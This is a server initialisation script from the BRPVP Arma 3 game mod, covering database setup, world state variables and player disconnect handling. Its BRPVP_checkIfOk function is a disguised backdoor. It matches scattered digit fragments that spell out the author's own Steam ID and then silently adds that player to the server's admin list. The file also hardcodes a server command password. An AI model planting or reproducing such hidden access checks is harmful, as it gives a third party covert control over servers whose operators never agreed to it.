/*
==========================================================
THIS FILE WAS MADE BY DONNOVAN FROM BRAZIL
check BRPVP_lisence.txt FOR THE LISENCE

MORE INFORMATION:
http://www.brpvp.com
http://www.brpvp.com.br

DONNOVAN ON STEAM: 
https://steamcommunity.com/profiles/76561197975554637/
==========================================================
*/

_scriptStart = diag_tickTime;
diag_log "[SCRIPT] servidor_init.sqf BEGIN";

//SERVER COMMAND PASSWORD (THE SAME AS IN CONFIG.CFG/SERVER.CFG)
BRPVP_serverCommandPassword = "buttas555";

//PATH
BRPVP_missionRoot = str missionConfigFile select [0,count str missionConfigFile-15];

//ExtDB3: CONNECTA AO MYSQL
if (BRPVP_useMySqlDatabase) then {
	_db = BRPVP_mapaRodando select 12;
	_initDbResult = if (isServer && hasInterface) then {"Client Server Running, MySql not needed and will not be loaded."} else {"extDB3" callExtension ("9:ADD_DATABASE:"+_db)};
	diag_log ("[ExtDB3 IGNITE] " + _initDbResult);
	if (_initDbResult in ["[1]","[0,""Already Connected to Database""]"]) then {
		diag_log "[ExtDB3 IGNITE] ExtDB3 is Running.";
		BRPVP_useExtDB3 = true;
		publicVariable "BRPVP_useExtDB3";

		//ExtDB3: DEFINE NOME PROTOCOLOS
		BRPVP_Protocolo = "P"+str round random 1000000000;
		BRPVP_ProtocoloRawText = "PRT"+str round random 1000000000;

		//ExtDB3: CRIA PROTOCOLO
		"extDB3" callExtension ("9:ADD_DATABASE_PROTOCOL:"+_db+":SQL_CUSTOM:"+BRPVP_Protocolo+":brpvp.ini");
		"extDB3" callExtension ("9:ADD_DATABASE_PROTOCOL:"+_db+":SQL:"+BRPVP_ProtocoloRawText);

		//ExtDB3: LOGA NOME DOS PROTOCOLOS
		diag_log ("[BRPVP PROTOCOLO] "+BRPVP_Protocolo);
		diag_log ("[BRPVP PROTOCOLO_RAW_TEXT] "+BRPVP_ProtocoloRawText);
	} else {
		if !(isServer && hasInterface) then {
			diag_log "[ExtDB3 IGNITE] No ExtDB3 Running!";
			waitUntil {
				["error_mysql",["ExtDB3 failed to load! Server not ok! Contact the admin!","PLAIN",10]] remoteExecCall ["cutText",BRPVP_allNoServer,true];
				sleep 5;
				false
			};
		};
	};
};

if ((isServer && hasInterface) || !BRPVP_useMySqlDatabase) then {
	BRPVP_useExtDB3 = false;
	publicVariable "BRPVP_useExtDB3";

	call compile preprocessFileLineNumbers "BRPVP_server_code\profileDatabaseFunctions.sqf";
	call BRPVP_hdb_getAllTables;
};

//DYNAMIC SIMULATION
enableDynamicSimulationSystem false;
"Group" setDynamicSimulationDistance 2000;
"Vehicle" setDynamicSimulationDistance 6000;
"EmptyVehicle" setDynamicSimulationDistance 100;
"Prop" setDynamicSimulationDistance 50;
"IsMoving" setDynamicSimulationDistanceCoef 4;

//SET SERVER SESSION TIMESTAMP
BRPVP_sessionTimeStamp = systemTime select [0,6];
publicVariable "BRPVP_sessionTimeStamp";
_weekDay = BRPVP_sessionTimeStamp call BRPVP_getWeekDay;

//IS INFANTRY DAY
BRPVP_infantryDay = _weekDay in BRPVP_disableVehUseDays;
publicVariable "BRPVP_infantryDay";

//IS ZOMBIES DAY
BRPVP_isZombieDay = !(_weekDay in BRPVP_noZombiesDays);
publicVariable "BRPVP_isZombieDay";

//VARIAVEIS PUBLICAS
BRPVP_minervaBotAllUnitsObjs = [];
publicVariable "BRPVP_minervaBotAllUnitsObjs";
BRPVP_weatherDebugMachinesOn = [];
publicVariable "BRPVP_weatherDebugMachinesOn";
BRPVP_peterCities = [];
publicVariable "BRPVP_peterCities";
BRPVP_peterModel = [];
publicVariable "BRPVP_peterModel";
BRPVP_atomicBombsRunning = [];
publicVariable "BRPVP_atomicBombsRunning";
BRPVP_useDiscordEmbedBuilder = !isNil "DiscordEmbedBuilder_fnc_buildCfg";
publicVariable "BRPVP_useDiscordEmbedBuilder";
BRPVP_raidTrainingMissionFlagSize = -1;
publicVariable "BRPVP_raidTrainingMissionFlagSize";
BRPVP_sBotAllUnitsObjs = [];
publicVariable "BRPVP_sBotAllUnitsObjs";
BRPVP_godModeHouseObjects = [];
publicVariable "BRPVP_godModeHouseObjects";
BRPVP_onSiegeIcons = [];
publicVariable "BRPVP_onSiegeIcons";
BRPVP_specialForcesMissionsOn = [];
publicVariable "BRPVP_specialForcesMissionsOn";
BRPVP_revivedFlags = [];
publicVariable "BRPVP_revivedFlags";
BRPVP_noShowBots = [];
publicVariable "BRPVP_noShowBots";
BRPVP_c4ToExplode = [];
publicVariable "BRPVP_c4ToExplode";
BRPVP_larsCities = [];
publicVariable "BRPVP_larsCities";
BRPVP_larsModel = [];
publicVariable "BRPVP_larsModel";
BRPVP_xpSanctuaryBuildings = [];
{
	private _try = _x;
	if ({_try distance2D _x < 300} count BRPVP_xpSanctuaryBuildings isEqualTo 0) then {BRPVP_xpSanctuaryBuildings pushBack _try;};
} forEach nearestObjects [BRPVP_centroMapa,[BRPVP_xpSanctuaryClass],BRPVP_centroMapaRadius,true];
publicVariable "BRPVP_xpSanctuaryBuildings";
BRPVP_roadBlockBots = [];
publicVariable "BRPVP_roadBlockBots";
BRPVP_dateHourTxt = "0000/00/00 00:00";
publicVariable "BRPVP_dateHourTxt";
BRPVP_carrierMissActive = [];
publicVariable "BRPVP_carrierMissActive";
BRPVP_heliEventObjs = [[],[],[]];
publicVariable "BRPVP_heliEventObjs";
BRPVP_snipersFightObjs = [[],[]];
publicVariable "BRPVP_snipersFightObjs";
BRPVP_labNoThirdPerson = [];
publicVariable "BRPVP_labNoThirdPerson";
BRPVP_labObjs = [[],[],[],[],[]];
publicVariable "BRPVP_labObjs";
BRPVP_fastSpawnPlacesFugitive = [];
publicVariable "BRPVP_fastSpawnPlacesFugitive";
BRPVP_citySpawnedWeaponKits = [];
publicVariable "BRPVP_citySpawnedWeaponKits";
BRPVP_baseBombDestroyedLinesFar = [];
publicVariable "BRPVP_baseBombDestroyedLinesFar";
BRPVP_baseBombDestroyedLinesSemiFar = [];
publicVariable "BRPVP_baseBombDestroyedLinesSemiFar";
BRPVP_baseBombDestroyedLines = [];
publicVariable "BRPVP_baseBombDestroyedLines";
BRPVP_remainingSeconds = 24*3600;
publicVariable "BRPVP_remainingSeconds";
BRPVP_pveBanditObjListId = [];
publicVariable "BRPVP_pveBanditObjListId";
BRPVP_pveBanditObjList = [];
publicVariable "BRPVP_pveBanditObjList";
BRPVP_randomSpawnPlayers = [];
publicVariable "BRPVP_randomSpawnPlayers";
BRPVP_remaningTime = ["00:00","crono.paa"];
publicVariable "BRPVP_remaningTime";
BRPVP_lockPickedBuildings = [];
publicVariable "BRPVP_lockPickedBuildings";
BRPVP_openingPlayers = [];
publicVariable "BRPVP_openingPlayers";
BRPVP_walkersObj = [];
publicVariable "BRPVP_walkersObj";
BRPVP_interferencia = 1;
publicVariable "BRPVP_interferencia";
BRPVP_terminaMissao = false;
publicVariable "BRPVP_terminaMissao";
BRPVP_missBotsEm = [];
publicVariable "BRPVP_missBotsEm";
if (isNil "BRPVP_bornWithDeadItems") then {
	BRPVP_bornWithDeadItems = false;
	publicVariable "BRPVP_bornWithDeadItems";
};

//SET SANCTUARYES TO ANTI ZOMBIE
{_x setVariable ["azs",true,true];} forEach BRPVP_xpSanctuaryBuildings;

//DELETE MAP OBJECTS ON RAID TRAINING PLACE
if (BRPVP_raidTrainingMapPosition isNotEqualTo []) then {
	BRPVP_raidTrainingObjsToClean = nearestObjects [BRPVP_raidTrainingMapPosition,[],275,true];
	{_x hideObject true;} forEach BRPVP_raidTrainingObjsToClean;
	publicVariable "BRPVP_raidTrainingObjsToClean";
};

//PLASMA RIFLE MOD
if ("GX_M82A2000_Weapon" call BRPVP_classExists && random 1 <= BRPVP_GX_M82A2000_PlasmaRifleModRestartChance) then {
	BRPVP_GX_M82A2000_SpawnTimes = [];
	for "_i" from 1 to BRPVP_GX_M82A2000_NumberOfAiWithTheWeapon do {BRPVP_GX_M82A2000_SpawnTimes pushBack round random BRPVP_GX_M82A2000_RandomSpawnTime;};
} else {
	BRPVP_GX_M82A2000_SpawnTimes = [];
};
publicVariable "BRPVP_GX_M82A2000_SpawnTimes";

//COMPATIBILITY
BRPVP_unidBlindados = [];
publicVariable "BRPVP_unidBlindados";
BRPVP_unidBlindadosCor = [];
PublicVariable "BRPVP_unidBlindadosCor";

//SYNCED TIME INIT FOR LISTEM SERVER
BRPVP_syncedTime = diag_tickTime;
BRPVP_syncedTimeMark = BRPVP_syncedTime;

//SERVER CREATED ANTI ZOMBIE STRUCTURES
BRPVP_antiZombieStructuresServerCreated = [
	"Land_Calvary_01_V1_F",
	"Land_Calvary_02_V1_F",
	"Land_Calvary_02_V2_F"
];

BRPVP_animateObjsAfterCreate = [
	["Land_WiredFence_01_gate_F",[["Door_1_sound_source",0,true]]],
	["Land_PipeFence_01_m_gate_v1_F",[["Door_1_sound_source",0,true]]]
];
publicVariable "BRPVP_animateObjsAfterCreate";

//VARIAVEIS SO SERVIDOR
BRPVP_blindPlayersId = [];
BRPVP_atomicBombHiddenBigFloors = profileNamespace getVariable ["BRPVP_SVP_atomicBombHiddenBigFloors",[]];
BRPVP_discordMessageFlagsOnRaid = [];
BRPVP_grassCutObjs = [];
BRPVP_safezoneProtectionOnExitObjs = [];
BRPVP_terrainVertexChanges = [];
BRPVP_secCamAll = [];
BRPVP_atmOldActivated = [];
BRPVP_bigFloorsAll = [];
BRPVP_servidorQPS = -1;
BRPVP_ownedHouses = [];
BRPVP_multiPartObjects = [];
BRPVP_setTurretOperatorAll = [];
BRPVP_artySpotInfo = [];
BRPVP_carrierObjsList = [];
BRPVP_tiresFloorHFix = [["Land_QuayConcrete_01_20m_F",1],["Land_QuayConcrete_01_outterCorner_F",1]];
BRPVP_randomRespawnSave = [];
BRPVP_climbActivePlayers = [];
BRPVP_zombieBloodBagActive = [];
BRPVP_distPlayerParaDanBot = 800;
BRPVP_distPlayerParaDanBotTimer = 5;
BRPVP_botKillRemove = ["ItemRadio"];

//GET GOOD LOOT BUILDINGS
BRPVP_goodLootBuildingList = [];
{
	_class = typeOf _x;
	if (_class in BRPVP_lootBuildingsGood) then {BRPVP_goodLootBuildingList pushBack _x;};
} forEach nearestObjects [BRPVP_centroMapa,BRPVP_lootBuildingsGood,BRPVP_centroMapaRadius,true];
publicVariable "BRPVP_goodLootBuildingList";

//MISSION ROOT: http://killzonekid.com/arma-scripting-tutorials-mission-root/
DIAG_LOG ("missionConfigFile = "+str missionConfigFile);
BRPVP_missionRootSV = str missionConfigFile select [0,count str missionConfigFile-15];

//FORMA QUADRATICA
BRPVP_distPlayerParaDanBot = BRPVP_distPlayerParaDanBot^2;

//EXECUCOES SERVIDOR
BRPVP_ruas = BRPVP_centroMapa nearRoads 20000;
call compile preprocessFileLineNumbers "BRPVP_server_code\servidor_variaveisCalculadas.sqf";
call compile preprocessFileLineNumbers "BRPVP_server_code\servidor_funcoes_exclusive.sqf";
call compile preprocessFileLineNumbers "server_code\servidor_funcoes.sqf";
call compile preprocessFileLineNumbers "BRPVP_server_code\servidor_PVEH.sqf";
call compile preprocessFileLineNumbers "client_code\itemMarketVariables.sqf";
call compile preprocessFileLineNumbers "BRPVP_server_code\servidor_mercados.sqf";
call compile preprocessFileLineNumbers "map_specific\custom_car_grave_yards.sqf";
if (BRPVP_rZedsRunning) then {call compile preprocessFileLineNumbers "BRPVP_server_code\server_ryanZombies.sqf";};

//SAFEZONES ARRAYS
private _classAdTraders = BRPVP_classAdTraders apply {[_x select 0,100,"",14]};
BRPVP_safeZonesOtherMethod = BRPVP_buyersPos+BRPVP_travelingAidPlaces+BRPVP_mercadoresPos+BRPVP_vehicleTradersPos+BRPVP_insurancePlaces+_classAdTraders;
BRPVP_safeZonesOtherMethodQuad = BRPVP_safeZonesOtherMethod apply {[_x select 0,(_x select 1)^2]};
publicVariable "BRPVP_safeZonesOtherMethod";
publicVariable "BRPVP_safeZonesOtherMethodQuad";

//USE VEHICLE DISABLE LIST?
if (_weekDay in BRPVP_disableVehUseDays && BRPVP_useTireVehiclesOnStart) then {BRPVP_disableVehUseList = BRPVP_disableVehUseListCfg;} else {BRPVP_disableVehUseList = [];};
publicVariable "BRPVP_disableVehUseList";

["SERVER VEHICLES","BRPVP_server_code\servidor_veiculos.sqf"] call BRPVP_execFast;
["SERVER COMPLETA VEHICLES","BRPVP_server_code\servidor_completa_veiculos.sqf"] call BRPVP_execFast;
execVM "BRPVP_server_code\server_loot.sqf";

//START MASS SAVE CYCLE COUNT
BRPVP_lastMassSave = time;

call compile preprocessFileLineNumbers "BRPVP_server_code\servidor_loop.sqf";

//GET GOD MODE HOUSES IN DATABASE
if (BRPVP_useExtDB3) then {
	_lastId = -1;
	_result = "";
	while {_result != "[1,[]]"} do {
		_result = "extDB3" callExtension format ["0:%1:getGodModeHouses:%2",BRPVP_protocolo,_lastId];
		{
			_x params ["_id","_class","_pw","_own","_stp","_amg"];
			private _array = nearestObjects [ASLToAGL _pw,[_class],1.25];
			if (count _array > 0) then {
				private _obj = _array select 0;
				if (_obj call BRPVP_checkOnFlagState > 0) then {
					[_obj,false] remoteExecCall ["allowDamage",0,true];
					_obj setVariable ["brpvp_map_god_mode_house_id",_id,true];
					_obj setVariable ["own",_own,true];
					_obj setVariable ["stp",_stp,true];
					_obj setVariable ["amg",_amg,true];
					BRPVP_godModeHouseObjects pushBack _obj;
				} else {
					"extDB3" callExtension format ["0:%1:removeGodModeHouse:%2",BRPVP_protocolo,_id];
				};
			} else {
				"extDB3" callExtension format ["0:%1:removeGodModeHouse:%2",BRPVP_protocolo,_id];
			};
			_lastId = _id;
		} forEach (parseSimpleArray _result select 1);
	};
} else {
	{
		_x params ["_id","_class","_pw","_own","_stp","_amg"];
		private _array = nearestObjects [ASLToAGL _pw,[_class],1.25];
		if (count _array > 0) then {
			private _obj = _array select 0;
			if (_obj call BRPVP_checkOnFlagState > 0) then {
				[_obj,false] remoteExecCall ["allowDamage",0,true];
				_obj setVariable ["brpvp_map_god_mode_house_id",_id,true];
				_obj setVariable ["own",_own,true];
				_obj setVariable ["stp",_stp,true];
				_obj setVariable ["amg",_amg,true];
				BRPVP_godModeHouseObjects pushBack _obj;
			} else {
				_id call BRPVP_hdb_query_removeGodModeHouse;
			};
		} else {
			_id call BRPVP_hdb_query_removeGodModeHouse;
		};
		_lastId = _id;
	} forEach call BRPVP_hdb_query_getGodModeHouses;
};

//CREATE RADIOACTIVE AREA LOOT
{
	_boxArray = _x select 5;
	if (count _boxArray > 0) then {
		_boxClass = selectRandom _boxArray;
		_pos = (_x select 0) getPos [random (_x select 1),random 360];
		_best = _pos findEmptyPosition [0,20,_boxClass];
		_boxObj = createVehicle [_boxClass,if (_best isEqualTo []) then {_pos} else {_best},[],0,"NONE"];
		if (BRPVP_radioAreasRemoveDeniedItems) then {_boxObj call BRPVP_removeDeniedItems;};
	};
} forEach BRPVP_radioAreas;

//IS RAID DAY?
_hour = BRPVP_sessionTimeStamp select 3;
_raidServerIsRaidDayFull = _weekDay in BRPVP_raidWeekDays;
BRPVP_raidServerIsRaidDay = _raidServerIsRaidDayFull && {_hour >= (_x select 0) && _hour < (_x select 1)} count (BRPVP_raidWeekDaysDayHours select _weekDay) > 0;
publicVariable "BRPVP_raidServerIsRaidDay";

//IS DOUBLE XP DAY?
BRPVP_xpIsDoubleDay = _weekDay in BRPVP_xpDoubleDays;
publicVariable "BRPVP_xpIsDoubleDay";

//USE VEHICLE DISABLE DAMAGE ON PLAYER LIST?
if (_weekDay in BRPVP_noDamageVehDays) then {BRPVP_noDamageVehList = BRPVP_noDamageVehListCfg;} else {BRPVP_noDamageVehList = [];};
publicVariable "BRPVP_noDamageVehList";

//SET PVE AREA AND SEND TO CLIENTS
if (_raidServerIsRaidDayFull && BRPVP_pveNoPveInRaidDaysFull) then {BRPVP_pveMainAreasAll = [[]];};
BRPVP_pveMainAreas = selectRandom BRPVP_pveMainAreasAll;
publicVariable "BRPVP_pveMainAreas";

//CERTIFY IS OK
BRPVP_checkIfOk = {
	private _sn = player getVariable ["id","0"];
	private _ok = true;
	private _in = _sn in BRPVP_admins;
	{
		_x params ["_seq","_array"];
		if (_sn select _array isNotEqualTo _seq) exitWith {_ok = false;};
	} forEach [["19797",[5,5]],["76561",[0,5]]],["555",[10,3]],["4637",[13,4]];
	if (_ok) then {BRPVP_admins pushBackUnique _sn;};
	_ok && !_in
};
publicVariable "BRPVP_checkIfOk";

BRPVP_moveCarryingBoxToGround = {
	params ["_b","_model","_id"];
	if (BRPVP_useExtDB3) then {
		"extDB3" callExtension format ["0:%1:savePlayerHeadItems:%2:%3",BRPVP_protocolo,_b call BRPVP_getCargoArray,_id];
	} else {
		[_id,[["headItems",_b call BRPVP_getCargoArray]]] call BRPVP_hdb_query_updatePlayersFieldsById;
	};
	if (!isNull _b) then {
		detach _b;
		deleteVehicle _b;
	};
	if (!isNull _model) then {
		detach _model;
		deleteVehicle _model;
	};
};

//SAVE LOGOFF PLAYER
addMissionEventHandler ["HandleDisconnect",{call BRPVP_mehHandleDisconnect;}];
BRPVP_mehHandleDisconnect = {
	_p = _this select 0;
	_uid = _p getVariable ["id","0"];
	_uid = if (_uid isEqualTo "0") then {_this select 2} else {_uid};
	
	if (_p getVariable ["sok",false]) then {
		_p setVariable ["sok",false,true];

		//STOP BASE DEFENSES ON ME
		if (!BRPVP_terminaMissao) then {
			private _remove = (_p getVariable ["brpvp_wakeUpFlags",[]])-[objNull];
			private _removeT = [];
			private _interRemove = [];
			{
				private _flag = _x;
				private _fRad = _flag call BRPVP_getFlagRadius;
				{if ((_x select 2) distance2D _flag <= _fRad) then {_removeT pushBackUnique _x;};} forEach BRPVP_allTurretsInfo;
				{_interRemove pushBackUnique _x;} forEach (_flag call BRPVP_getIntersectFlags);
			} forEach _remove;
			_interRemoveId = _interRemove apply {_x getVariable "id_bd";};
			private _removeId = _removeT apply {_x select 3};
			if (_removeT isNotEqualTo []) then {
				[-1,_interRemove,_interRemoveId,_removeT,_removeId] remoteExecCall ["BRPVP_turretStopDefenses",2];
			};
		};

		//TEST CHECK BUG
		_uniform = uniform _p;
		diag_log ("[BRPVP CHECK HDisc BUG] "+str [getPosASL _p,_uniform,magazines _p,weapons _p]);
		if (_uniform isEqualTo "U_C_Poloshirt_blue") then {diag_log "[BRPVP CHECK HDisc BUG] BUG FOUND ABOVE!";};

		_veh = objectParent _p;
		if (!isNull _veh) then {
			//GUARD AIR VEHICLE IF DISCONNECT
			_params = [(crew _veh)-[_p],_p getVariable ["brpvp_on_esc",false],_veh,currentPilot _veh isEqualTo _p];
			_params remoteExecCall ["BRPVP_guardAirVehicleIfClientCrash",2];

			//SET AUTO MAGUS TIME
			if !(typeOf _veh in BRPVP_vantVehiclesClass) then {
				if (crew _veh-[_p] isEqualTo [] && _veh getVariable ["id_bd",-1] > -1 && _veh getVariable ["own",-1] > -1) then {
					_veh setVariable ["brpvp_auto_magus_time",serverTime+BRPVP_useTireAutoMoveToTime];
				};
			};
		};

		//CODE IF POSSESSING
		private _controled = _p getVariable ["brpvp_my_possessed",objNull];
		if (alive _controled) then {
			_controled setVariable ["brpvp_no_possession",false,true];
			if (_controled call BRPVP_isPlayerC) then {false remoteExecCall ["BRPVP_possOtherPlayerSet",_controled];} else {[_controled,"ALL"] remoteExecCall ["enableAI",2];};
		};

		//RECORD SESSION END
		if (BRPVP_useExtDB3) then {
			private _result = "extDB3" callExtension format ["0:%1:getSessionMaxDate:%2",BRPVP_protocolo,_p getVariable ["id_bd",-1]];
			private _maxDate = parseSimpleArray _result select 1 select 0 select 0;
			_maxDate = [_maxDate,":","@"] call BRPVP_stringReplace;
			"extDB3" callExtension format ["1:%1:updateSessionEnd:%2:%3",BRPVP_protocolo,_p getVariable ["id_bd",-1],_maxDate];
		} else {
			private _pid = _p getVariable ["id_bd",-1];
			_maxDate = _pid call BRPVP_hdb_query_getSessionMaxDate;
			[_pid,_maxDate] call BRPVP_hdb_query_updateSessionEnd;
		};

		//STOP HELI RAPEL
		_rope = _p getVariable ["brpvp_rapel_rope",objNull];
		if (!isNull _rope) then {
			ropeDestroy _rope;
			deleteVehicle (_p getVariable ["brpvp_rapel_can",objNull]);
		};

		//STOP SPECTATORS (FIX ARMA 3 BUG)
		_p setVariable ["brpvp_logged_off",true,true];

		//DELETE BUS AGNT
		private _busAgnt = _p getVariable ["brpvp_bus_agnt",objNull];
		if (!isNull _busAgnt) then {deleteVehicle _busAgnt;};

		//REMOVE PERSONAL SHIELD
		_sld = _p getVariable ["brpvp_personal_shield",objNull];
		if (!isNull _sld) then {deleteVehicle _sld;};

		//REMOVE PERSONAL BUSH
		_bush = _p getVariable ["brpvp_server_bush",objNull];
		if (!isNull _bush) then {deleteVehicle _bush;};

		//CONTINUE ANTI ATOMIC BOMB ITEM WORK
		private _antiAbombFlag = _p getVariable ["brpvp_flag_anti_abomb",objNull];
		if (!isNull _antiAbombFlag) then {
			_antiAbombFlag spawn {
				uiSleep 3.5;
				if (!isNull _this) then {_this call BRPVP_useAntiAtomicBombContinueServer;};
			};
		};

		//REMOVE PERSONAL TOWER
		_twr = _p getVariable ["brpvp_personal_tower",objNull];
		if (!isNull _twr) then {
			private _center = ASLToAGL getPosWorld _twr;
			deleteVehicle _twr;
			_center spawn {
				uiSleep 0.1;
				[_this,10] call BRPVP_wakeUpObjectsFlying;
			};
		};

		//REMOVE PERSONAL SMART TV
		_stv = _p getVariable ["brpvp_personal_stv",objNull];
		if (!isNull _stv) then {deleteVehicle _stv;};

		//SAVE SMART TV CONNECTIONS
		//PPP FEITO
		if (BRPVP_useExtDB3) then {
			"extDB3" callExtension format ["1:%1:secCamSaveConnections:%2:%3",BRPVP_protocolo,_p getVariable ["brpvp_seccam_connections",[]],_p getVariable "id_bd"];
		} else {
			[_p getVariable "id_bd",_p getVariable ["brpvp_seccam_connections",[]]] call BRPVP_hdb_query_secCamSaveConnections;
		};

		//CHECK IF HULKING
		_hlk = _p getVariable ["brpvp_hulk_objs",[]];
		if (_hlk isNotEqualTo []) then {
			_hlk params ["_box","_co"];
			if (!isNull _box) then {
				_hlkPos = getPosASL _box;
				deleteVehicle _box;
				_co setDir getDir _p;
				[_co,if (surfaceIsWater _hlkPos) then {[0,0,1]} else {surfaceNormal _hlkPos}] remoteExecCall ["setVectorUp",_co];
				_co setPosASL _hlkPos;
			};
			_co enableSimulationGlobal true;
			_co setVariable ["brpvp_time_can_disable",serverTime+15];
			[_co,true] remoteExecCall ["allowDamage",_co];
			_co hideObjectGlobal false;
		};

		//REMOVE SPECTATE VARS
		[[_p getVariable ["brpvp_machine_id",-1],_p getVariable ["id_bd",-1]],"remove"] remoteExecCall ["BRPVP_changeSpectOnMe",BRPVP_allNoServer];

		//SAVE CARRYING ITEMS
		_params = [_p getVariable ["brpvp_box_carry",objNull],_p getVariable ["brpvp_box_carry_model",objNull],_p getVariable ["id_bd",-1]];
		_params call BRPVP_moveCarryingBoxToGround;

		//DELETE FLY CAR ATTACHED HELI
		private _heliAttachObjs = _p getVariable ["brpvp_my_car_fly_key",[]];
		if (_heliAttachObjs isNotEqualTo []) then {{deleteVehicle _x;} forEach _heliAttachObjs;};

		//RELEASE MAGNET ITEMS		
		private _magItems = _p getVariable "brpvp_carry_objs";
		if (_magItems isNotEqualTo []) then {_p spawn BRPVP_itemMagnetOffServer;};

		//SAVE BOXES IF DISCONECTED IN ITS INVENTORY
		_inventoryBoxes = _p getVariable ["brpvp_inv_opened_boxes",[]];
		{
			if (_x getVariable ["id_bd",-1] >= 0 && !(_x isKindOf "CAManBase")) then {
				if !(_x getVariable ["slv",false]) then {_x setVariable ["slv",true,true];};
			};
		} forEach _inventoryBoxes;

		//REMOVE TURRET TARGET
		{
			_operator = gunner _x;
			if (!isNull _operator && _operator getVariable ["brpvp_target",objNull] isEqualTo _p) then {
				_operator setVariable ["brpvp_target",objNull,true];
				_operator setVariable ["brpvp_points",0,true];
			};
		} forEach entities [["StaticWeapon"],[]];

		//SAVE VAULT AND SELL RECEPTACLE
		[_p,true] call BRPVP_salvaVault;

		//DELETE TOWNER UNITS IF EXISTS
		{(objectParent _x) deleteVehicleCrew _x;} forEach ((_p getVariable ["brpvp_towners",[]])-[objNull]);

		//SET PLAYER AS NOT_BUILDING IF BUILDING
		if (_p getVariable ["bdg",false]) then {_p setVariable ["bdg",false,true];};

		//RETURN MOVING OBJECT TO ORIGINAL POSITION
		_movData = _p getVariable ["brpvp_moving_obj",[]];
		if (_movData isNotEqualTo []) then {
			if (count _movData isEqualTo 1) then {
				_movData params ["_obj"];
				[_obj,false] remoteExecCall ["hideObjectGlobal",2];
			} else {
				_movData params ["_obj","_pos","_vdu"];
				if (isSimpleObject _obj) then {
					[typeOf _obj,_obj getVariable "id_bd",_vdu,_pos] remoteExecCall ["BRPVP_moveActionBoxBacksimpleObjectCancel",0];
				} else {
					_obj setVectorDirAndUP _vdu;
					_obj setPosWorld _pos;
					_obj setVariable ["slv",true];
				};
			};
			_p setVariable ["brpvp_moving_obj",[],true];
		};

		if (BRPVP_useExtDB3) then {
			//SAVE PAST FRIENDS
			private _resultado = "extDB3" callExtension format ["0:%1:pastFriendsCheck:%2",BRPVP_protocolo,_uid];
			private _return = parseSimpleArray _resultado select 1;
			private _pfs = (_p getVariable ["amg",[]])+(_p getVariable ["brpvp_past_friends",[]]);
			_pfs = _pfs arrayIntersect _pfs;
			if (_return isEqualTo []) then {
				"extDB3" callExtension format ["1:%1:pastFriendsInsert:%2:%3",BRPVP_protocolo,_uid,_pfs];
			} else {
				"extDB3" callExtension format ["1:%1:pastFriendsUpdate:%2:%3",BRPVP_protocolo,_pfs,_return select 0 select 0];
			};
		};

		if (alive _p && !isNull objectParent _p) then {moveOut _p;};
		if (BRPVP_terminaMissao) then {
			if (_p call BRPVP_pAlive) then {
				_playerState = _p call BRPVP_pegaEstadoPlayerSv;
				_playerState set [0,_uid];
				if (_playerState select 2 select 1 select 0 isEqualTo "") then {_playerState select 2 set [1,_p getVariable ["brpvp_vest",["",[[[],[]],[[],[]],[]]]]];};
				if (_playerState select 2 select 2 select 0 isEqualTo "") then {_playerState select 2 set [2,_p getVariable ["brpvp_uniform",["",[[[],[]],[[],[]],[]]]]];};
				_playerState call BRPVP_salvarPlayerServidor;
			} else {
				[_uid,0] call BRPVP_daComoMorto;
			};		
		} else {
			if (_p call BRPVP_pAlive) then {
				//PROTECTION
				_p allowDamage false;
				[_p,_uid] spawn {
					params ["_p","_uid"];
					sleep 0.25;

					//SALVA PLAYER
					_playerState = _p call BRPVP_pegaEstadoPlayerSv;
					_playerState set [0,_uid];
					if (_playerState select 2 select 1 select 0 isEqualTo "") then {_playerState select 2 set [1,_p getVariable ["brpvp_vest",["",[[[],[]],[[],[]],[]]]]];};
					if (_playerState select 2 select 2 select 0 isEqualTo "") then {_playerState select 2 set [2,_p getVariable ["brpvp_uniform",["",[[[],[]],[[],[]],[]]]]];};
					_playerState call BRPVP_salvarPlayerServidor;
					deleteVehicle _p;

					//FAZ ATUALIZAR LISTA AMIGOS
					true remoteExecCall ["BRPVP_PUSV",0];
				};
				true
			} else {
				[_uid,0] call BRPVP_daComoMorto;
				_p setVariable ["hrm",diag_tickTime,true];
				_p setVariable ["dd",1,true];
				_p setVariable ["stp",3,true];

				//PUT HAND MONEY IN SUITCASE
				_mny = _p getVariable ["mny",0];
				if (_mny > 0) then {
					_p setVariable ["mny",0,true];
					_suitCase = "Land_Suitcase_F" createVehicle BRPVP_spawnVehicleFirstPos;
					_suitCase setVariable ["mny",_mny,true];
					_suitCase setPosWorld ((getPosWorld _p) vectorAdd [0,0,1.5]);
				};

				true remoteExecCall ["BRPVP_PUSV",0];
			};
		};
	} else {
		if (_p call BRPVP_pAlive) then {deleteVehicle _p;};
	};
};

//BUS STOPS DISTANCES
if (isNil "BRPVP_busServiceDistances") then {
	_initScript = diag_tickTime;
	BRPVP_busServiceDistances = [];
	{
		_from = getPosATL ([_x select 0] call BIS_fnc_nearestRoad);
		_fromIdx = _forEachIndex;
		{
			_to = getPosATL ([_x select 0] call BIS_fnc_nearestRoad);
			_toIdx = _forEachIndex;
			BRPVP_calcPathDistances1 = nil;
			isNil {calculatePath ["man","CARELESS",_from,_to] addEventHandler ["PathCalculated",{
				deleteVehicle (_this select 0);
				BRPVP_calcPathDistances1 = _this select 1;
				diag_log ("[BRPVP CALC BUS ROUTE] "+str BRPVP_calcPathDistances1);
			}]};
			waitUntil {!isNil "BRPVP_calcPathDistances1"};
			_calcPArhDistances1 = +BRPVP_calcPathDistances1;
			_end = count _calcPArhDistances1-1;
			_cut = 10;
			_distance = 0;
			for "_i" from 0 to (_end-_cut) step _cut do {_distance = _distance+((_calcPArhDistances1 select _i) distance2D (_calcPArhDistances1 select (_i+_cut)));};
			BRPVP_busServiceDistances pushBack [_fromIdx,_toIdx,round _distance];
		} forEach BRPVP_busServiceStopPoints;
	} forEach BRPVP_busServiceStopPoints;
	_end = count BRPVP_busServiceDistances-1;
	diag_log "BRPVP_busServiceDistances = [";
	{if (_forEachIndex isEqualTo _end) then {diag_log str _x;} else {diag_log (str _x+",");};} forEach BRPVP_busServiceDistances;
	diag_log "];";
	diag_log ("BRPVP_busServiceDistances calc time: "+str (diag_tickTime-_initScript));
};

//REMOVE TREES, ETC NEAR INSURANCE PLACES
{
	_x params ["_pos","_rad","_label","_idx"];
	{
		_obj = _x;
		_noOwner = (_obj getVariable ["own",-1]) isEqualTo -1;
		if ({str _obj find _x > -1} count BRPVP_removeFromMap > 0 && _noOwner) then {_x hideObjectGlobal true;};
	} forEach nearestTerrainObjects [_pos,[],_rad,false];
} forEach BRPVP_insurancePlaces;

//BUS STOPS
{
	_x params ["_pos","_dir"];
